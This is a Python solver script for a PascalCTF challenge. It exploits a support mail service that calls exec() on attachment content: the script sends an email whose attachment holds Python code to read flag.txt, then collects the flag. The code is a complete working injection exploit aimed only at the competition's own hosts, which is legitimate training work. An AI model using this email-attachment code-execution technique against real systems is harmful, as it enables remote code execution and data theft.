#!/usr/bin/env python3
"""
SurgoCompany CTF Challenge Solver

The vulnerability: check_attachment() uses exec() on attachment content.
We send a Python payload as an email attachment that reads flag.txt.

Usage:
1. Generate email creds at: https://surgoservice.ctf.pascalctf.it
2. Run this script with the credentials
3. The flag will be printed by the remote server
"""

import smtplib
import imaplib
import email
import time
import argparse
import re
from email.message import EmailMessage
from email.utils import parseaddr
from getpass import getpass
from pwn import remote

IMAP_SERVER = "surgo.ctf.pascalctf.it"
SMTP_SERVER = "surgo.ctf.pascalctf.it"
NC_HOST = "surgobot.ctf.pascalctf.it"
NC_PORT = 6005

PAYLOAD = 'print(open("flag.txt").read())'

def get_email_from_service(username, password):
    """Poll inbox for the support email and extract the subject/pid."""
    print("[*] Connecting to IMAP server...")
    mail = imaplib.IMAP4_SSL(IMAP_SERVER)
    mail.login(username, password)

    print("[*] Waiting for support email...")
    for _ in range(30):
        mail.select('inbox')
        _, data = mail.search(None, 'UNSEEN')

        if data[0]:
            email_ids = data[0].split()
            for eid in email_ids:
                _, msg_data = mail.fetch(eid, '(RFC822)')
                msg = email.message_from_bytes(msg_data[0][1])
                subject = msg.get("Subject", "")
                if "Surgo Company Customer Support" in subject:
                    print(f"[+] Received email: {subject}")
                    mail.store(eid, '+FLAGS', '\\Seen')
                    mail.close()
                    mail.logout()
                    return subject
        time.sleep(2)

    mail.close()
    mail.logout()
    return None


def send_reply(username, password, subject):
    """Send reply with malicious payload attachment."""
    print(f"[*] Sending reply with payload...")

    msg = EmailMessage()
    msg['From'] = username
    msg['To'] = f"support@skillissue.it"  # Company email
    msg['Subject'] = f"Re: {subject}"
    msg.set_content("Please check the attached file for my issue.")

    # Add payload as attachment
    msg.add_attachment(
        PAYLOAD.encode(),
        maintype='text',
        subtype='plain',
        filename='issue.py'
    )

    with smtplib.SMTP_SSL(SMTP_SERVER, 465) as smtp:
        smtp.login(username, password)
        smtp.send_message(msg)

    print("[+] Reply sent with payload!")


def main():
    parser = argparse.ArgumentParser(description='SurgoCompany CTF Solver')
    parser.add_argument('--username', '-u', help='Email username (e.g., user-abc123@skillissue.it)')
    parser.add_argument('--password', '-p', help='Email password')
    args = parser.parse_args()

    username = args.username or input("Email username: ").strip()
    password = args.password or getpass("Email password: ")

    if not username.endswith("@skillissue.it"):
        username += "@skillissue.it"

    print(f"\n[*] Using email: {username}")

    # Step 1: Connect to the nc service and trigger email
    print(f"\n[*] Connecting to {NC_HOST}:{NC_PORT}...")
    r = remote(NC_HOST, NC_PORT)

    # Wait for prompt and send email
    r.recvuntil(b"Enter your email address:")
    r.sendline(username.encode())

    print("[+] Email sent to service, waiting for response...")

    # Step 2: Wait for and receive the support email
    time.sleep(3)  # Give the server time to send
    subject = get_email_from_service(username, password)

    if not subject:
        print("[-] Failed to receive support email!")
        r.close()
        return

    # Step 3: Send reply with payload
    send_reply(username, password, subject)

    # Step 4: Receive the flag from nc connection
    print("\n[*] Waiting for flag output...")
    time.sleep(5)

    try:
        output = r.recvall(timeout=30).decode()
        print("\n" + "="*50)
        print("Server output:")
        print(output)
        print("="*50)

        # Try to extract flag
        flag_match = re.search(r'PascalCTF\{[^}]+\}', output)
        if flag_match:
            print(f"\n[+] FLAG: {flag_match.group()}")
    except Exception as e:
        print(f"[-] Error receiving output: {e}")
    finally:
        r.close()


if __name__ == "__main__":
    main()
